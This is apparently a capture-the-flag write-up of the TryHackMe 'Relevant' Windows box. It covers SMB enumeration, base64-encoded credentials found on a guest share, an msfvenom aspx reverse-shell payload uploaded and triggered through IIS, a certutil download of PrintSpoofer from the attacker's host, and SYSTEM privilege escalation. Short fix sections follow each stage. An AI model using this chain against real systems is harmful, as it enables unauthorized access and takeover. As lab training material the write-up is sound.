Links: [[TryHackMe Boxes]]
#Windows 

# Relevant

### System IP: 10.10.184.138
Note that the system crashed multiple times and we had to reboot the machine. This changed the IP of the box after the *Initial Shell Vulnerability Exploited* section.

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.184.138      | **TCP**: 135,139,445,3389,49663,49667,49669

**Nmap Scan Results:**
```
# Nmap 7.91 scan initiated Tue Feb 16 19:41:05 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/ttl0/autorecon/results/10.10.184.138/scans/_full_tcp_nmap.txt -oX /home/ttl0/autorecon/results/10.10.184.138/scans/xml/_full_tcp_nmap.xml 10.10.184.138
adjust_timeouts2: packet supposedly had rtt of -158039 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -158039 microseconds.  Ignoring time.
Nmap scan report for 10.10.184.138
Host is up, received user-set (0.097s latency).
Scanned at 2021-02-16 19:41:05 EST for 244s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 127 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-02-17T00:44:30+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-16T00:34:41
| Not valid after:  2021-08-18T00:34:41
| MD5:   7198 b9e1 1672 32c2 187a 08e1 04fd a6dd
| SHA-1: 52ef bf86 5c69 9f4a fd07 0673 0bc5 3e0c 8b44 6aec
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQJCKDwOE17a5Kgb9geQf3DjANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMTAyMTYwMDM0NDFaFw0yMTA4MTgwMDM0
| NDFaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAv5CoRnBGBS2iBwV+PHF7F3oLKpBlabooQ3DGgn903HR8G1YxzZuf
| Xp1e1BD9dYgwYv1zu81Itul6mwNQzYR1s8TVAV8du54qYBaoik4SBD+7jWGOZ60F
| P3GKeJoWuG6BUQfDti4MgmAo442aXTGlzFZhqA+gyQ8nS1f4jjCeB3PWDCU8tqy2
| W1+IZCHgv5K03Fm0WuGdJS7wgGDTuz4GCzoSsCfyw7ogwId++29r3fD8QdbPr7BT
| EauEPv+0C2CPLI+jqIp1yjkN1ZCAA3rvq7n5lU8VQ1XJXjZLAEEP5KBqWH2raYMp
| NyUB0JDn14JcXcq1d+glj4baYM+g8d7ALwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAF/VzeNV4xUz
| 6Emf0wpPN5LXnoEPq4nuE5FyfB981MRRCkvY3Xcj9EkGoorri1nKaCXQt3eo1Pq0
| VCCiA6XnHeup/iJ9S7vWUKBQRXW0rtTLu0kTP6KJvww75HhVGfv2Ca1Luw/EiUIV
| ABuXDzhctrsYwh3xnYIejwox6PQd0PJcJQoQunDLxqeah4agFJafgttbqvRtqVug
| g9Q3Dmkaqv1fmC72oJLjPQv6W61/voGkkcxibGwwrY9ep8s4kph3TuOV8xGsi9bf
| I26CuVrFKIpxIQWPbStIvTZ0IiaeneRmXg+Nrnfb/sHsV8WjSu74Ejug2tFiYGSu
| 4UN9vAY3ous=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-02-17T00:45:10+00:00; +2s from scanner time.
49663/tcp open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/16%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=602C6715%P=x86_64-pc-linux-gnu)
SEQ(SP=108%GCD=1%ISR=109%TS=A)
OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M506NW8ST11%O6=M506ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M506NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.008 days (since Tue Feb 16 19:33:17 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m02s, deviation: 3h34m41s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16516/tcp): CLEAN (Timeout)
|   Check 2 (port 22667/tcp): CLEAN (Timeout)
|   Check 3 (port 3580/udp): CLEAN (Timeout)
|   Check 4 (port 59039/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-02-16T16:44:33-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-17T00:44:34
|_  start_date: 2021-02-17T00:35:04

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   97.17 ms 10.9.0.1
2   97.46 ms 10.10.184.138

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 16 19:45:09 2021 -- 1 IP address (1 host up) scanned in 244.52 seconds

```
SMB Scans finds vulnerable service

```
# Nmap 7.91 scan initiated Tue Feb 16 19:42:21 2021 as: nmap -vv --reason -Pn -sV -p 445 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args=unsafe=1 -oN /home/ttl0/autorecon/results/10.10.184.138/scans/tcp_445_smb_nmap.txt -oX /home/ttl0/autorecon/results/10.10.184.138/scans/xml/tcp_445_smb_nmap.xml 10.10.184.138
Nmap scan report for 10.10.184.138
Host is up, received user-set (0.096s latency).
Scanned at 2021-02-16 19:42:21 EST for 104s

PORT    STATE SERVICE      REASON          VERSION
445/tcp open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.184.138\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.184.138\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.184.138\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.184.138\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-ls: Volume \\10.10.184.138\nt4wrksv
| SIZE   TIME                 FILENAME
| <DIR>  2020-07-25T15:10:05  .
| <DIR>  2020-07-25T15:10:05  ..
| 98     2020-07-25T15:13:05  passwords.txt
|_
| smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-02-16T16:42:35-08:00
|_smb-print-text: false
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb2-capabilities: 
|   2.02: 
|     Distributed File System
|   2.10: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.00: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.02: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.11: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-17T00:42:53
|_  start_date: 2021-02-17T00:35:04

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 16 19:44:05 2021 -- 1 IP address (1 host up) scanned in 104.44 seconds

```

**Web Enumeration Results:**
We found the following page through enumeration:
```
└─$ cat tcp_49663_http_gobuster.txt
/aspnet_client (Status: 301) [Size: 164]
/nt4wrksv (Status: 301) [Size: 159] 
```

The second URL is the same name as one of the SMB drives nmap enumerated:
```
|   \\10.10.184.138\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

smbmap enumerated as a guest sessions the following
```
[+] Guest session       IP: 10.10.184.138:445   Name: 10.10.184.138                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-34c-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-268-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2d8-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1d8-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    TermSrv_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    Ctx_WinStation_API_service
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    SessEnvPublicRpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-68-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-798-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    winreg
        fr--r--r--                6 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2d0-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iisipm67e7b254-e418-4c65-85a7-fbd1532427ff
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    BWy4h6VS76FjqDeR2REOG3ueGhZ2d8sovDu4AgyAfTtXHrheyIEkrXKiL9xuII3MpQvU11Dx8vpULzzRGKeat4oRJAkH5rcayXwXFpAbbIaL3zexgKnCWP
        nt4wrksv                                                READ, WRITE
        .\nt4wrksv\*
        dr--r--r--                0 Tue Feb 16 19:42:29 2021    .
        dr--r--r--                0 Tue Feb 16 19:42:29 2021    ..
        fr--r--r--               98 Sat Jul 25 11:35:44 2020    passwords.txt
┌──(ttl0㉿kali)-[~/autorecon/results/10.10.184.138/scans]

```

Noticed the passwords.txt file

**Initial Shell Vulnerability Exploited:**

We get the passwords.txt file using smbmap
```
─$ sudo smbmap -R nt4wrksv -H 10.10.155.50 -u guest -p "" -P 445 -A passwords.txt
[sudo] password for ttl0:
[+] IP: 10.10.155.50:445        Name: 10.10.155.50
[+] Starting search for files matching 'passwords.txt' on share nt4wrksv.
[+] Match found! Downloading: nt4wrksv\passwords.txt

```

The file contains
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

```

These are base64 decodable strings:
```
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123┌──(ttl0㉿kali)-[~/autorecon/results]
└─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
Bill - Juw4nnaM4n420696969!$$$┌──(ttl0㉿kali)-[~/autorecon/results]
```

We found in the enumeration web portion that on port 49663 an url with the same SMB drive name. We try and see if we can read further data through the web server:
```
http://10.10.32.79:49663/nt4wrksv/passwords.txt
```

We know we have Write access through nmap enumeration too:
```
       nt4wrksv                                                READ, WRITE
        .\nt4wrksv\*
        dr--r--r--                0 Tue Feb 16 19:42:29 2021    .
        dr--r--r--                0 Tue Feb 16 19:42:29 2021    ..
        fr--r--r--               98 Sat Jul 25 11:35:44 2020    passwords.txt
```

We generate a reverse shell payload using msfvenom:
```
└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.0.124 lport=1337 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3418 bytes
Saved as: shell.aspx
```

We prepare a reverse shell:
```
└─$ nc -lvnp 1337
listening on [any] 1337 ...

```

We connect through smb and upload the reverse aspx shell
```
─$ smbclient -p 445 //10.10.32.79/nt4wrksv -U guest
Enter WORKGROUP\guest's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4922253 blocks available
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (1.8 kb/s) (average 1.8 kb/s)
smb: \> ls
  .                                   D        0  Tue Feb 16 23:17:41 2021
  ..                                  D        0  Tue Feb 16 23:17:41 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  shell.aspx                          A     3405  Tue Feb 16 23:17:42 2021

```

We load the shell by accessing the webpage:
```
http://10.10.32.79:49663/nt4wrksv/shell.aspx
```

We get a reverse shell:
```
listening on [any] 1337 ...
connect to [10.9.0.124] from (UNKNOWN) [10.10.32.79] 49790
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```

**Vulnerability Explanation:**
An SMB share that is accessible through the "guest" account and also allows write privileges allowed us to obtain a reverse shell by accessing the file through a web server. The web server mirrored the SMB share data and allowed read access to ASPX files.

**Vulnerability Fix:**
Disable the guest user on the SMB share. Do not allow Write access on SMB share by un-authenticated users. Disable 

**Severity:**
High

**Local.txt Proof Screenshot**

![](20210216233018.png)

**Local.txt Contents**
```
C:\Users\Bob\Desktop>Hostname && echo %username% && type C:\Users\Bob\Desktop\user.txt && ipconfig /all
Hostname && echo %username% && type C:\Users\Bob\Desktop\user.txt && ipconfig /all
Relevant
RELEVANT$ 
THM{fdk4ka34vk346ksxfr21tg789ktf45}
Windows IP Configuration

   Host Name . . . . . . . . . . . . : Relevant
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.compute.internal

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 02-B5-E5-F2-C9-E7
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::cd91:1b32:e77:9b81%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.32.79(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Tuesday, February 16, 2021 8:16:25 PM
   Lease Expires . . . . . . . . . . : Tuesday, February 16, 2021 9:16:24 PM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 101073078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AE-44-DC-08-00-27-7C-35-30
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter Local Area Connection* 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:3ca5:1fd2:f5f5:dfb0(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::3ca5:1fd2:f5f5:dfb0%3(Preferred) 
   Default Gateway . . . . . . . . . : ::
   DHCPv6 IAID . . . . . . . . . . . : 134217728
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AE-44-DC-08-00-27-7C-35-30
   NetBIOS over Tcpip. . . . . . . . : Disabled

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

```

#### Privilege Escalation

Using SharpUp for enumeration we find the following:
```
=== *Special* User Privileges ===

                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED


```

Searching through google we find a blog explaining a vulnerability for Windows Server 2016 SeImpersonatePrivilege:
```
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
```

We go to a writable directory and download the POC discussed in the blog.
```
c:\windows\system32\inetsrv>cd C:\Users\Temp
cd C:\Users\Temp
C:\Windows\Temp>certutil.exe -urlcache -f http://10.9.0.78/PrintSpoofer.exe spoofer.exe
certutil.exe -urlcache -f http://10.9.0.78/PrintSpoofer.exe spoofer.exe
****  Online  ****  
CertUtil: -URLCache command completed successfully.

```

We invoke a "cmd" shell
```
C:\Windows\Temp>.\spoofer -i -c cmd
.\spoofer -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

We got SYSTEM
```
C:\Windows\system32>whoami
whoami
nt authority\system

```

**Vulnerability Exploited:**
Privilege escalation via Named pipe impersonation.

**Vulnerability Explanation:**
When we have the SeImpersonate Privilege on Windows 8.1, Windows Server 2012 R2, Windows 10 and Windows Server 2019, it is possible to impersonate the SYSTEM user through the use of a named pipe. In this case we used a tool that leverages the Print Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()

**Vulnerability Fix:**
You can disable the user account "Impersonate a client after authentication" SeImpresonate user rights.

**Severity:**
Critical

**Exploit Code:**
Source code:
```
https://github.com/ttl0/PrintSpoofer
```

Exe:
```
https://github.com/ttl0/printspoofer-exe
```

**Proof Screenshot Here:**

![](20210218204749.png)

**Proof.txt Contents:**
```
C:\Users\Administrator\Desktop>Hostname && echo %username% && type root.txt && ipconfig /all
Hostname && echo %username% && type root.txt && ipconfig /all
Relevant
RELEVANT$ 
THM{1fk5kf469devly1gl320zafgl345pv}
Windows IP Configuration

   Host Name . . . . . . . . . . . . : Relevant
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.compute.internal

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 02-7C-87-5E-68-73
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::a897:d8a:97ac:3c9d%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.92.207(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, February 18, 2021 5:25:12 PM
   Lease Expires . . . . . . . . . . : Thursday, February 18, 2021 6:25:11 PM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 101073078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AE-44-DC-08-00-27-7C-35-30
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter Local Area Connection* 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:283d:28c3:f5f5:a330(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::283d:28c3:f5f5:a330%3(Preferred) 
   Default Gateway . . . . . . . . . : ::
   DHCPv6 IAID . . . . . . . . . . . : 134217728
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AE-44-DC-08-00-27-7C-35-30
   NetBIOS over Tcpip. . . . . . . . : Disabled

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

```